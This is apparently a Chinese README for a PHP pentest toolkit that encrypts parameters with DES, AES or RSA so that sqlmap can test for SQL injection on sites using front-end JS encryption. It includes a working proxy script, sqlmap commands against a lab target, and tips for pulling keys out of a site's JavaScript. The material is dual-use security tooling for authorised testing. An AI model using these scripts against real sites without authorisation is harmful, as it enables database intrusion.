### 0x01 实现功能

实现DES/AES/RSA批量加密,单个密文的解密以及AES/DES SQL注入脚本，适用场景为渗透测试遇到前端JS加密的时候，以及使用（crypto-js/JSEncrypt加密库）的情况，快速定位key，将目标网站的加密key提取出来，在使用脚本进行测试。

### 0x02 环境需求

需要使用 PHP 7.1 及以下版本，mcrypt 加密扩展已经在 PHP 7.2 中被弃用；加解密脚本因为直接调用远端加密库，因此需要能访问互联网，其他脚本不用；php环境可以使用phpStudy，灵活切换php版本。

![06](https://user-images.githubusercontent.com/56350031/229093307-0150d6f6-87f4-4433-ae58-8bdca0db05a1.jpg)

### 0x03 脚本说明：

#### 加解密脚本

AES_decryption.php 、AES_encrypt.php、DES_decryption.php、DES_encrypt.php

RSA  //不涉及加密模式以及填充方式

//使用ECB，Pkcs7填充模式，如果需要其他模式可以找到mode: CryptoJS.mode.ECB, padding: CryptoJS.pad.Pkcs7，更改ECB以及Pkcs7即可，代码中已添加详细注释；

加密模式（可选项）：

```
CBC
CFB
CTR
CTRGladman
ECB  //不支持IV
OFB
```

填充方式（可选项）：

```
Ansix923
Iso10126
Iso97971
NoPadding
Pkcs7
ZeroPadding
```



#### SQL注入脚本

AES_SQL.php #**POST方式提交**，使用ECB以及Pkcs7填充方式，ECB模式无法加入随机数；

DES_SQL.php #**GET方式提交**，其余和AES的一样，如果遇到POST的提交方式，把AES的提交方式复制替换就可。

注：注入脚本有时需要根据实际环境对代码进行调整，比如加密方式、填充方式、key、POST提交数据请求参数名以及格式，以下为修改代码的示例，根据场景复制替换脚本代码即可。

其他：

- 加密的模式以及填充方式不同会导致密文不同

- 有使用随机数的可以看test文件夹下的脚本，脚本中有示例，参照进行修改

- 加密模式修改示例

  ```
  //CBC
  $iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC), MCRYPT_RAND);
  $encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $plaintext, MCRYPT_MODE_CBC, $iv);
  
  //CFB
  $iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CFB), MCRYPT_RAND);
  $encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $plaintext, MCRYPT_MODE_CFB, $iv);
  
  //OFB
  $iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_OFB), MCRYPT_RAND);
  $encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $plaintext, MCRYPT_MODE_OFB, $iv);
  ```

- 填充方式修改示例代码

  ```
  //ISO 10126 填充方式：
  $pad_size = $block_size - (strlen($plaintext) % $block_size);
  $padding = "";
  for ($i = 0; $i < $pad_size - 1; $i++) {
      $padding .= chr(mt_rand(0, 255));
  }
  $padding .= chr($pad_size);
  $plaintext .= $padding;
  
  //ANSI X.923 填充方式：
  $pad_size = $block_size - (strlen($plaintext) % $block_size);
  $padding = str_repeat(chr(0), $pad_size - 1) . chr($pad_size);
  $plaintext .= $padding;
  
  //Zero Padding 填充方式：
  $pad_size = $block_size - (strlen($plaintext) % $block_size);
  $padding = str_repeat(chr(0), $pad_size);
  $plaintext .= $padding;
  ```

- 请求数据，JSON格式修改示例
  ```
  $data = array("name" => "John Doe", "email" => "johndoe@example.com");  //key value
  $data_json = json_encode($data);

  curl_setopt($curl, CURLOPT_POSTFIELDS, $data_json);   //引入请求
  ```

- 随机user-agent
  ```
  // 定义多个 User-Agent
  $user_agents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3 Edge/16.16299'
  ];

  //随机选择一个 User-Agent
  $rand_index = array_rand($user_agents);
  $rand_user_agent = $user_agents[$rand_index];

  $headers = array(                             //请求头根据需求自加自减
      'Content-Type: application/x-www-form-urlencoded',
      'User-Agent: ' . $rand_user_agent,   //使用.进行连接
  );
  ```

### 0x04 功能演示

#### AES加密脚本演示：（DES和AES一样，相差无几）

![229034928-fc6c4814-8bce-4358-b387-eb54766dd03f](https://user-images.githubusercontent.com/56350031/229093404-4b827324-47a1-4f76-892a-ea6fa709d9c8.png)


效果：

![229035051-bdeac323-37ff-4cb3-ac29-6ee98a55fe70](https://user-images.githubusercontent.com/56350031/229093434-0a098fdd-39c1-454f-a2dd-6806f91285c0.png)


#### SQL注入脚本演示：

脚本执行流程：

sqlmap -- GET获取传参 -- 加密 -- 组装请求体 --curl请求 --获取响应--sqlmap判断是否存在漏洞； 

演示：

因为没有合适的环境，演示只能证明本端发出的数据包无问题 

拓扑：

（sqlmap）-10.10.70.10（运行php脚本）--10.10.70.109漏洞环境

步骤：

a、验证经过php脚本的代理后sqlmap依然能判断出存在sql漏洞

这里有个坑，提交的数据必须要和view soure格式一致

![01](https://user-images.githubusercontent.com/56350031/229093511-de539197-8f7c-4f68-9659-9992a3badaee.jpg)


uname=admin&passwd=123456&submit=Submit

测试脚本sql_test.php里面提交的参数也必须做调整

```
<?php
// GET方式获取传参，示例：127.0.0.1/sql_test.php?param1=admin&param2=123456
$param1 = $_GET['param1'];
$param2 = $_GET['param2'];

// 设置POST请求中的参数,需要注意传参的个数以及名称
$sub = "Submit";
$data = array(
    'uname' => $param1,   //uname参数名，$param1值
    'passwd' => $param2_base64,  //对应密码的参数名
    'submit' => $sub      //第三个参数，再数组外赋值后带入
);

//向目标网站发送post请求
// 设置POST请求的URL和请求头信息
$url = 'http://10.10.70.109/sqli/Less-11/index.php';   //目标 URL
$headers = array(                             //请求头根据需求自加自减
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
);

// 初始化curl
$ch = curl_init();

// 设置curl的相关参数
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

// 执行curl请求
$response = curl_exec($ch);

// 关闭curl资源
curl_close($ch);

// 输出响应结果
echo $response;
?>
```

sqlmap

```
sqlmap -u "http://10.10.70.6/php/test/sql_test.php?param1=test&param2=123456" -p param1
```

测试截图

![02](https://user-images.githubusercontent.com/56350031/229093611-576c978c-fe0f-43ca-b61a-45181641c04a.jpg)


b、验证加密后的参数能准确到达目标服务器，增加加密代码

```
$key = "akcdefg3bcdkffff";   //设置加密密钥

$block_size = mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_ECB);   //加密模式

//设置$param2的填充方式
$pad_size = $block_size - (strlen($param2) % $block_size);
$param2 .= str_repeat(chr($pad_size), $pad_size);

//参数加密
$param2 = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $param2, MCRYPT_MODE_ECB);

// 对密文进行base64，在赋值给$param2_base64
$param2_base64 = base64_encode($param2);

// 设置POST请求中的参数,需要注意传参的个数以及名称
$sub = "Submit";
$data = array(
    'uname' => $param1,   //uname参数名，$param1值
    'passwd' => $param2_base64,  //对应密码的参数名
    'submit' => $sub      //第三个参数，再数组外赋值后带入
);
```

sqlmap

```
sqlmap -u "http://10.10.70.6/php/test/sql_test.php?param1=test&param2=123456" -p param2
```

测试截图

wireshark查看请求包

![image](https://user-images.githubusercontent.com/56350031/229400336-45e45cfd-42d5-41ae-994c-57abe753d98f.png)

服务器上接收到的数据

![03](https://user-images.githubusercontent.com/56350031/229093690-98b399fd-a93f-4d4f-b0b4-0be68c9809aa.jpg)


可以看到用户名为明文，sqlmap提交过来的口令为密文，将第三行密文解密如下：

![04](https://user-images.githubusercontent.com/56350031/229093726-327f6fee-4f04-46fb-97cc-80417cfbe53a.jpg)


![05](https://user-images.githubusercontent.com/56350031/229093758-f15b64a2-78db-4033-8066-677bd57b3f49.jpg)

DES注入脚本一致，因此不做验证。

需要注意的点如下：

- DES使用php编写出来的注入脚本对key的长度有限制，DES key必须小于等于8个字节，在crypto-js中可以超出该限制，所以超过8个字节的key无法使用DES注入脚本，AES无限制；
- 传参必须要和浏览器提交的参数view soure格式一致，注入前先提交一遍，查看格式在改脚本进行注入；
- AES以及DES需要确认加密方式以及填充方式，根据特征寻找，在根据上述提供修改示例替换对应代码，变量名。
- 在vscode有一个插件（php intelephense）会检查代码错误，版本不符合有些就会标红，不用管。
- 修改脚本中的key
- 运行脚本时可以使用wireshark确认提交的HTTP请求数据是否有误；

### 0x05 前端寻找key的方式： 

#### 搜索关键词

浏览器F12，search关键词有：encrypt、passwd、password、MD5、AES、DES等

RSA特征

```
new JSEncrypt();
a.setPublicKey("key");
a.encrypt(passwd);

new rsa的加密对象
xxx.set设置publickey     //设置公钥
xxx.调用加密方法（“明文”）  //加密
```

DES特征

```

  key = "ffffffffffff"; // 密钥

  // 将密钥从字符串转换为字节数组
  keyBytes = CryptoJS.enc.Utf8.parse(key); 

  // 使用 DES 加密算法加密消息
  encrypted = CryptoJS.DES.encrypt(message, keyBytes, {
    mode: CryptoJS.mode.ECB, // 使用 ECB 模式
    padding: CryptoJS.pad.Pkcs7, // 使用 PKCS#7 填充方式
  });
```

AES特征

```
function Encrypt(xxx){  
	var xxx  = xxx.enc.Utf8.parse('key');
    var xx = xxx.enc.Utf8.parse(xxx);  
    var xxx = xxx.AES.encrypt(xxx);  
} 
```
案例一、（较简单）
登录时发现密码是加密的，这里使用关键词encrypt进行搜索，搜索encrypt后可以看到找到了我们想要的结果，跟进去下断点，获取key

![image](https://user-images.githubusercontent.com/56350031/230535422-486cb97d-8fbe-4086-8d04-5842efd68f50.png)

点击搜索结果，跟进index文件后就能看到加密方法以及key等

![image](https://user-images.githubusercontent.com/56350031/230535734-8553b86c-8296-42b4-b227-4f85fc42980b.png)

此加密方式为3DES，后续在补充注入脚本
案例二、（待补充）
